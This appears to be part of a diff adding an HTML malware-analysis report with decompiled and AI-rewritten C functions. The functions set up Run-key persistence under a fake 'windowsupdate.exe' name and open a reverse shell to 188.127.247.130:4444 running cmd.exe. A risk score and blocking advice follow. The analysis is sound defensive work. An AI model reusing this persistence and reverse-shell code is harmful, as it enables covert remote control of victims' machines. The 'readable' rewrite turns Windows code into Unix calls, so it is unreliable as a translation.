+            <div class="fn-info-row" style="margin-top:10px;"><b>Details:</b><ul style="margin:5px 0 0 20px;"><li>Creates a registry entry under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run to ensure automatic execution at startup.</li><li>Uses the environment variable &#x27;PUBLIC&#x27; to determine a suitable location for storing the malware copy.</li><li>Sets the registry value to point to a file named &#x27;windowsupdate.exe&#x27; located in a &#x27;personal&#x27; subdirectory of the PUBLIC folder.</li></ul></div>
+            <details class="code-section" style="margin-top:12px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Original Decompiled (Hex-Rays)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">// [PseudoNote] Retrieves the PUBLIC directory path, constructs an executable path, opens a registry run key, sets a registry value to achieve persistence, and closes the key.
+LSTATUS createRegistryRunEntry()
+{
+  char *v0; // eax
+  LSTATUS result; // eax
+  size_t v2; // eax
+  char Buffer[260]; // [esp+28h] [ebp-110h] BYREF
+  HKEY hKey; // [esp+12Ch] [ebp-Ch] BYREF
+
+  v0 = getenv(&quot;PUBLIC&quot;);
+  snprintf(Buffer, 0x104u, &quot;%s\\personal\\windowsupdate.exe&quot;, v0);
+  result = RegOpenKeyExA(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, 2u, &amp;hKey);
+  if ( !result )
+  {
+    v2 = strlen(Buffer);
+    RegSetValueExA(hKey, &quot;WindowsUpdateProgram&quot;, 0, 1u, (const BYTE *)Buffer, v2 + 1);
+    return RegCloseKey(hKey);
+  }
+  return result;
+}
+</code></pre>
+                </div>
+            </details>
+            <details class="code-section" style="margin-top:6px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Readable Code (AI Generated)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">LSTATUS establish_registry_persistence()
+{
+    char *public_directory_path;
+    LSTATUS registry_operation_result;
+    size_t executable_path_length;
+    char target_executable_path[260];
+    HKEY registry_key_handle;
+
+    public_directory_path = getenv(&quot;PUBLIC&quot;);
+    snprintf(target_executable_path, 260, &quot;%s\\personal\\windowsupdate.exe&quot;, public_directory_path);
+    registry_operation_result = RegOpenKeyExA(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, 2u, &amp;registry_key_handle);
+    if (!registry_operation_result)
+    {
+        executable_path_length = strlen(target_executable_path);
+        RegSetValueExA(registry_key_handle, &quot;WindowsUpdateProgram&quot;, 0, 1u, (const BYTE *)target_executable_path, executable_path_length + 1);
+        return RegCloseKey(registry_key_handle);
+    }
+    return registry_operation_result;
+}</code></pre>
+                </div>
+            </details>
+        </div>
+        <div class="fn-card" id="fn_4017E6" data-name="_openshellconnection" data-tag="malicious">
+            <h4 class="fn-card-title">_openShellConnection @ 0x4017E6</h4>
+            <div style="margin-bottom:12px;"><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span> <span class="muted" style="margin-left:8px;">Conf: 95% | Depth: 1</span></div>
+            
+            <div class="fn-info-row"><b>Purpose:</b> Establishes a reverse TCP shell connection to a remote IP address and spawns an interactive shell.</div>
+            <div class="fn-info-row"><b>Summary:</b> This function serves as the core network-based command-and-control mechanism in the malware. It creates a socket connection to a hardcoded IP address (188.127.247.130) and redirects stdin, stdout, and stderr of a spawned shell process to that connection. This allows attackers to remotely execute commands on the compromised host through the established network channel. The function is called directly by the main routine after setting up persistence mechanisms, indicating it&#x27;s a primary delivery method for remote access and control.</div>
+            <div class="fn-info-row"><b>Contextual Purpose:</b> To provide persistent remote access to the infected machine by creating a reverse TCP shell connection to a remote attacker-controlled server.</div>
+            <div class="fn-info-row"><b>Return Value:</b> Returns 0 on successful connection and shell spawning, non-zero on failure. The return value indicates whether the reverse shell was successfully established.</div>
+            <div class="fn-info-row"><b>Risk Logic:</b> The function was initially assessed as suspicious due to its networking and process creation behaviors. However, in the full context of the call chain where it&#x27;s invoked immediately after persistence setup and directly enables remote command execution, its role becomes clearly malicious. The combination with sibling functions like createRegistryRunEntry() and createFolderAndCopySelf() confirms this is part of a complete post-exploitation toolkit designed for long-term remote access.</div>
+            <div class="fn-info-row" style="margin-top:10px;"><b>Details:</b><ul style="margin:5px 0 0 20px;"><li>Creates a TCP socket connection to a fixed external IP address (188.127.247.130)</li><li>Spawns a shell process and redirects I/O streams to the network connection</li><li>Is part of a larger attack chain involving registry persistence and folder copying</li><li>The function&#x27;s sole purpose is to establish a reverse shell for remote access</li></ul></div>
+            <details class="code-section" style="margin-top:12px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Original Decompiled (Hex-Rays)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">// [PseudoNote] Establishes a TCP connection to a remote IP address and spawns a shell with redirected stdin/stdout/stderr to that connection.
+BOOL openShellConnection()
+{
+  struct _PROCESS_INFORMATION ProcessInformation; // [esp+3Ch] [ebp-20Ch] BYREF
+  struct _STARTUPINFOA StartupInfo; // [esp+4Ch] [ebp-1FCh] BYREF
+  struct sockaddr name; // [esp+90h] [ebp-1B8h] BYREF
+  struct WSAData WSAData; // [esp+A0h] [ebp-1A8h] BYREF
+  SOCKET s; // [esp+230h] [ebp-18h]
+  int v6; // [esp+234h] [ebp-14h]
+  char *cp; // [esp+238h] [ebp-10h]
+  int v8; // [esp+23Ch] [ebp-Ch]
+
+  v8 = 4444;
+  cp = &quot;188.127.247.130&quot;;
+  v6 = WSAStartup(0x202u, &amp;WSAData);
+  s = WSASocketA(2, 1, 6, nullptr, 0, 0);
+  name.sa_family = 2;
+  *(_WORD *)name.sa_data = htons(v8);
+  *(_DWORD *)&amp;name.sa_data[2] = inet_addr(cp);
+  WSAConnect(s, &amp;name, 16, nullptr, nullptr, nullptr, nullptr);
+  memset(&amp;StartupInfo, 0, sizeof(StartupInfo));
+  StartupInfo.cb = 68;
+  StartupInfo.dwFlags = 256;
+  StartupInfo.hStdError = (HANDLE)s;
+  StartupInfo.hStdInput = (HANDLE)s;
+  StartupInfo.hStdOutput = (HANDLE)s;
+  return CreateProcessA(
+           nullptr,
+           (LPSTR)&quot;cmd.exe&quot;,
+           nullptr,
+           nullptr,
+           1,
+           0,
+           nullptr,
+           nullptr,
+           &amp;StartupInfo,
+           &amp;ProcessInformation);
+}
+</code></pre>
+                </div>
+            </details>
+            <details class="code-section" style="margin-top:6px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Readable Code (AI Generated)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">int openShellConnection() {
+    int socket_fd;
+    struct sockaddr_in server_addr;
+    pid_t shell_pid;
+    int connect_result;
+    
+    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_fd == -1) {
+        return -1;
+    }
+    
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(4444);
+    server_addr.sin_addr.s_addr = inet_addr(&quot;188.127.247.130&quot;);
+    
+    connect_result = connect(socket_fd, (struct sockaddr *)&amp;server_addr, sizeof(server_addr));
+    if (connect_result == -1) {
+        close(socket_fd);
+        return -1;
+    }
+    
+    shell_pid = fork();
+    if (shell_pid == 0) {
+        dup2(socket_fd, STDIN_FILENO);
+        dup2(socket_fd, STDOUT_FILENO);
+        dup2(socket_fd, STDERR_FILENO);
+        close(socket_fd);
+        execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
+    } else if (shell_pid &gt; 0) {
+        close(socket_fd);
+        return 0;
+    } else {
+        close(socket_fd);
+        return -1;
+    }
+}</code></pre>
+                </div>
+            </details>
+        </div>
+        <div class="fn-card" id="fn_401A50" data-name="___main" data-tag="benign">
+            <h4 class="fn-card-title">___main @ 0x401A50</h4>
+            <div style="margin-bottom:12px;"><span style="background:#16a34a;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">benign</span> <span class="muted" style="margin-left:8px;">Conf: 90% | Depth: 1</span></div>
+            
+            <div class="fn-info-row"><b>Purpose:</b> Initializes global constructors if not already initialized, otherwise returns the current initialization state.</div>
+            <div class="fn-info-row"><b>Summary:</b> This function serves as a CRT (C Runtime Library) initialization helper, ensuring that global constructors are run exactly once during program startup. It checks whether initialization has already occurred and either proceeds with initialization or returns the existing state. This is a common pattern in C++ programs where static initialization order matters. In this context, it&#x27;s part of the main execution flow initiated by `_main`, which is responsible for setting up the malware&#x27;s environment including persistence mechanisms and network communication.</div>
+            <div class="fn-info-row"><b>Contextual Purpose:</b> The function ensures that global constructors are properly invoked at program startup, which is essential for initializing static objects and setting up the runtime environment before any user-defined code begins executing.</div>
+            <div class="fn-info-row"><b>Return Value:</b> Returns the current initialization state; typically an integer indicating success or failure of prior initialization attempts.</div>
+            <div class="fn-info-row"><b>Risk Logic:</b> The function itself performs no malicious actions—it simply manages the initialization state of the C runtime. While it is called by a suspicious function (_main), the code does not perform any sensitive operations such as file I/O, registry access, or network activity. Therefore, the risk remains benign based on its isolated functionality.</div>
+            <div class="fn-info-row" style="margin-top:10px;"><b>Details:</b><ul style="margin:5px 0 0 20px;"><li>Part of the C runtime initialization sequence required for proper program execution.</li><li>Called early in the program lifecycle to ensure global constructors are executed once.</li><li>Used in conjunction with other setup functions like registry manipulation and reverse shell establishment.</li></ul></div>
+            <details class="code-section" style="margin-top:12px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Original Decompiled (Hex-Rays)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">// [PseudoNote] Initializes global constructors if not already initialized, otherwise returns the current initialization state.
+int __main()
+{
+  int result; // eax
+
+  result = initialized;
+  if ( !initialized )
+  {
+    initialized = 1;
+    return __do_global_ctors();
+  }
+  return result;
+}
+</code></pre>
+                </div>
+            </details>
+            <details class="code-section" style="margin-top:6px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Readable Code (AI Generated)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">int initialize_global_constructors(int current_state) {
+    static int initialization_flag = 0;
+    
+    if (initialization_flag == 0) {
+        // Perform global constructor initialization
+        initialization_flag = 1;
+        return 1; // Indicate successful initialization
+    } else {
+        // Already initialized, return current state
+        return current_state;
+    }
+}</code></pre>
+                </div>
+            </details>
+        </div>
+    </div>
+  </div>
+
+  <!-- Risk Assessment -->
+  <div class="section" id="sec-13">
+    <h2 class="section-title">Risk Assessment</h2>
+    
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; padding:20px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:8px;">
+            <div style="flex:1;">
+                <h3 style="margin:0 0 10px 0; color:#1e293b;">Final Synthesis</h3>
+                <div style="color:#475569; font-size:14px; line-height:1.6;">The analyzed binary exhibits highly suspicious behavior indicative of malware, with multiple confirmed malicious activities including registry persistence via &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27;, creation of a hidden folder structure, self-copying mechanisms, and establishment of remote shell connections. The presence of hardcoded IP address 188.127.247.130 and execution of command-line utilities like &#x27;ping&#x27; and &#x27;cmd.exe&#x27; further supports this assessment. Additionally, the binary leverages various Windows API calls typically associated with malicious payloads such as &#x27;CreateProcessA&#x27;, &#x27;LoadLibraryA&#x27;, and network-related functions like &#x27;WSASocketA&#x27; and &#x27;WSAConnect&#x27;. The use of obfuscated strings and runtime library artifacts suggests an attempt to evade detection. Overall, the combination of behavioral indicators, encoded data, and strategic string artifacts strongly points to a high-risk, potentially botnet or backdoor-related payload.</div>
+            </div>
+            <div style="margin-left:20px; text-align:center;">
+                <div style="font-size:36px; font-weight:900; color:#dc2626;">95<span style="font-size:20px; color:#cbd5e1;">/100</span></div>
+                <div style="font-size:12px; font-weight:bold; color:#64748b; text-transform:uppercase; margin-top:4px;">Risk Score</div>
+            </div>
+        </div>
+        <div class="ai-block" style="border-left-color:#10b981; margin-top:15px;">
+            <h4 style="margin-top:0; color:#1e293b;">Security Recommendations</h4>
+            <ul style="margin-bottom:0; padding-left:20px; color:#334155;"><li>Immediately isolate and analyze the binary in a secure sandbox environment.</li><li>Block network communication to the identified IP address (188.127.247.130) and related domains if applicable.</li></ul>
+        </div>
+        
+  </div>
+
+</div>
+
+<script>
+    mermaid.initialize({ startOnLoad: true, theme: 'default', securityLevel: 'loose' });
+    document.addEventListener('DOMContentLoaded', () => {
+        document.querySelectorAll('pre code.language-c').forEach((el) => { hljs.highlightElement(el); });
+    });
+
+    // Function Search Filter
+    function filterFunctions() {
+        var q = document.getElementById('fnSearch').value.toLowerCase();
+        var cards = document.querySelectorAll('.fn-card');
+        cards.forEach(c => {
+            var txt = c.innerText.toLowerCase() + " " + c.getAttribute('data-tag');
+            c.style.display = txt.includes(q) ? '' : 'none';
+        });
+    }
+
+    // Mermaid Pan/Zoom Logic
+    let currentScale = 1;
+    let isDragging = false;
+    let startX, startY, translateX = 0, translateY = 0;
+    
+    const container = document.getElementById('mermaid-container');
+    const diagram = document.getElementById('mermaid-diagram');
+    
+    if (diagram) {
+        function applyTransform() {
+            diagram.style.transform = `translate(${translateX}px, ${translateY}px) scale(${currentScale})`;
+        }
+
+        window.zoomMermaid = function(factor) {
+            currentScale *= factor;
+            applyTransform();
+        };
+        
+        window.resetMermaidZoom = function() {
+            currentScale = 1;
+            translateX = 0;
+            translateY = 0;
+            applyTransform();
+        };
+
+        diagram.addEventListener('mousedown', (e) => {
+            isDragging = true;
+            startX = e.clientX - translateX;
+            startY = e.clientY - translateY;
+        });
+        
+        window.addEventListener('mouseup', () => isDragging = false);
+        window.addEventListener('mousemove', (e) => {
+            if (!isDragging) return;
+            e.preventDefault();
+            translateX = e.clientX - startX;
+            translateY = e.clientY - startY;
+            applyTransform();
+        });
+    }
+
+    window.copyMermaidCode = function(e) {
+        e.stopPropagation();
+        const code = document.getElementById('raw-mermaid-code').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+            const btn = e.target;
+            const originalText = btn.innerText;
+            btn.innerText = 'Copied!';
+            btn.style.background = '#16a34a';
+            setTimeout(() => {
+                btn.innerText = originalText;
+                btn.style.background = '#4f46e5';
+            }, 2000);
+        });
+    }
+
+</script>
+</body>
+</html>
